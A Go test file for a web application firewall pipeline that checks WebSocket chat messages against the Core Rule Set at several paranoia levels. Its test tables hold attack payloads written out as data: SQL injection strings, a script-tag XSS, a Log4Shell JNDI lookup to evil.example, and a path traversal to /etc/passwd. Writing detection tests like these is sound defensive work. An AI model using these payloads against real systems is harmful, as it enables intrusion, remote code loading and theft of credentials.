// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package pipeline_test

import (
	"context"
	"net/http"
	"slices"
	"testing"
	"time"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/router"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// benignMessages are what chat and dashboard WebSockets send.
var benignMessages = []string{
	`{"type":"message","room":"lobby","text":"Hello, how are you today?","ts":1730650000}`,
	`{"type":"subscribe","channels":["ticker.BTC-USD","orders"],"id":42}`,
	`{"op":"ping"}`,
	`hello world`,
	`Let's meet at 10:30 tomorrow - bring the slides!`,
	`["presence",{"user":"alice","status":"away","since":"2026-11-03T10:00:00Z"}]`,
}

// TestWebSocketMessagesWithCRS: benign messages raise nothing at paranoia
// levels 1 to 3 (#276); at 4, rule 920273 (the strict character range)
// denies a space in any argument, a message's as a form's. Attacks in a
// JSON field or in plain text are denied.
func TestWebSocketMessagesWithCRS(t *testing.T) {
	hs := browserHandshake("HTTP/1.1", "/chat?room=lobby", true)
	for pl := 1; pl <= 4; pl++ {
		eval, err := coraza.New(coraza.Config{ParanoiaLevel: pl})
		if err != nil {
			t.Fatal(err)
		}
		p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second})
		for _, m := range benignMessages {
			v := p.CheckWebSocketMessage(context.Background(), hs, []byte(m), false)
			if pl <= 3 && (v.Action != pipeline.ActionAllow || len(v.RuleIDs) != 0) {
				t.Errorf("paranoia %d, %q: action=%s rules=%v score=%d", pl, m, v.Action, v.RuleIDs, v.AnomalyScore)
			}
			if pl == 4 && v.Action != pipeline.ActionAllow {
				t.Logf("paranoia %d, %q: action=%s rules=%v score=%d", pl, m, v.Action, v.RuleIDs, v.AnomalyScore)
			}
		}
	}

	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second})
	for _, tt := range []struct {
		msg  string
		rule int
	}{
		{`{"type":"search","q":"1' OR '1'='1' -- "}`, 942100},
		{`{"user":{"name":"<script>alert(1)</script>"}}`, 941100},
		{`["log","${jndi:ldap://evil.example/a}"]`, 944150},
		{`1' UNION SELECT password FROM users -- `, 942100},
		{`../../../../etc/passwd`, 930110},
	} {
		v := p.CheckWebSocketMessage(context.Background(), hs, []byte(tt.msg), false)
		if v.Action != pipeline.ActionDeny || v.Reason != pipeline.ReasonRule || !slices.Contains(v.RuleIDs, tt.rule) {
			t.Errorf("%q: action=%s reason=%s rules=%v, want a deny with rule %d", tt.msg, v.Action, v.Reason, v.RuleIDs, tt.rule)
		}
	}
}

// TestWebSocketMessageVerdicts: detect mode logs, a cut message is
// handled as an oversized body, and routes the policy skips aren't
// inspected.
func TestWebSocketMessageVerdicts(t *testing.T) {
	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	routes, err := router.New([]string{"/health"}, []string{"/upload/*"})
	if err != nil {
		t.Fatal(err)
	}
	attack := []byte(`{"q":"1' OR '1'='1' -- "}`)
	clean := []byte(`{"q":"hello"}`)
	for _, tt := range []struct {
		name      string
		mode      pipeline.Mode
		oversize  pipeline.OversizeAction
		uri       string
		msg       []byte
		truncated bool
		action    pipeline.Action
		reason    pipeline.Reason
		status    int
	}{
		{"block attack", pipeline.ModeBlock, pipeline.OversizeAuto, "/chat", attack, false, pipeline.ActionDeny, pipeline.ReasonRule, http.StatusForbidden},
		{"detect attack", pipeline.ModeDetect, pipeline.OversizeAuto, "/chat", attack, false, pipeline.ActionLog, pipeline.ReasonRule, 0},
		{"clean", pipeline.ModeBlock, pipeline.OversizeAuto, "/chat", clean, false, pipeline.ActionAllow, pipeline.ReasonNone, 0},
		{"cut, block", pipeline.ModeBlock, pipeline.OversizeAuto, "/chat", clean, true, pipeline.ActionDeny, pipeline.ReasonOversize, http.StatusRequestEntityTooLarge},
		{"cut, allowed", pipeline.ModeBlock, pipeline.OversizeAllow, "/chat", clean, true, pipeline.ActionAllow, pipeline.ReasonOversize, 0},
		{"cut attack, allowed", pipeline.ModeBlock, pipeline.OversizeAllow, "/chat", attack, true, pipeline.ActionDeny, pipeline.ReasonRule, http.StatusForbidden},
		{"skipped route", pipeline.ModeBlock, pipeline.OversizeAuto, "/health", attack, false, pipeline.ActionAllow, pipeline.ReasonSkipped, 0},
		{"skipped body", pipeline.ModeBlock, pipeline.OversizeAuto, "/upload/x", attack, false, pipeline.ActionAllow, pipeline.ReasonSkipped, 0},
	} {
		t.Run(tt.name, func(t *testing.T) {
			p := pipeline.New(eval, pipeline.Config{Mode: tt.mode, Oversize: tt.oversize, Timeout: 10 * time.Second, Routes: routes})
			hs := browserHandshake("HTTP/1.1", tt.uri, true)
			v := p.CheckWebSocketMessage(context.Background(), hs, tt.msg, tt.truncated)
			if v.Action != tt.action || v.Reason != tt.reason || v.Status != tt.status {
				t.Fatalf("action=%s reason=%s status=%d, want %s %s %d", v.Action, v.Reason, v.Status, tt.action, tt.reason, tt.status)
			}
		})
	}
}

// TestWebSocketMessageNotScoredOnTheHandshake (#363): a handshake that
// scores 3 (920230, multiple URL encoding, at paranoia level 2) passed; a
// message scoring 3 on its own passes too, instead of adding up to the
// threshold of 5. Its attacks are still denied.
func TestWebSocketMessageNotScoredOnTheHandshake(t *testing.T) {
	eval, err := coraza.New(coraza.Config{ParanoiaLevel: 2})
	if err != nil {
		t.Fatal(err)
	}
	p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second})
	hs := browserHandshake("HTTP/1.1", "/chat?q=%2541", true)
	if v := p.Check(context.Background(), hs); v.Action != pipeline.ActionAllow || v.AnomalyScore != 3 {
		t.Fatalf("handshake: %s, score %d, want allowed with 3", v.Action, v.AnomalyScore)
	}
	for _, m := range []string{"hello", "%2541"} {
		v := p.CheckWebSocketMessage(context.Background(), hs, []byte(m), false)
		if v.Action != pipeline.ActionAllow || v.AnomalyScore > 3 {
			t.Errorf("message %q: %s, score %d, rules %v: the handshake's score counts", m, v.Action, v.AnomalyScore, v.RuleIDs)
		}
	}
	v := p.CheckWebSocketMessage(context.Background(), hs, []byte(`{"q":"1' OR '1'='1' -- "}`), false)
	if v.Action != pipeline.ActionDeny {
		t.Errorf("SQLi message: %s, rules %v", v.Action, v.RuleIDs)
	}
}

// BenchmarkWebSocketMessage is the cost of inspecting one chat message
// with the CRS (#363): its own arguments, not the handshake's headers and
// query again.
func BenchmarkWebSocketMessage(b *testing.B) {
	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		b.Fatal(err)
	}
	p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second})
	hs := browserHandshake("HTTP/1.1", "/chat?room=lobby&user=alice", true)
	msg := []byte(benignMessages[0])
	ctx := context.Background()
	b.ReportAllocs()
	for b.Loop() {
		if v := p.CheckWebSocketMessage(ctx, hs, msg, false); v.Action != pipeline.ActionAllow {
			b.Fatal(v.Action)
		}
	}
}
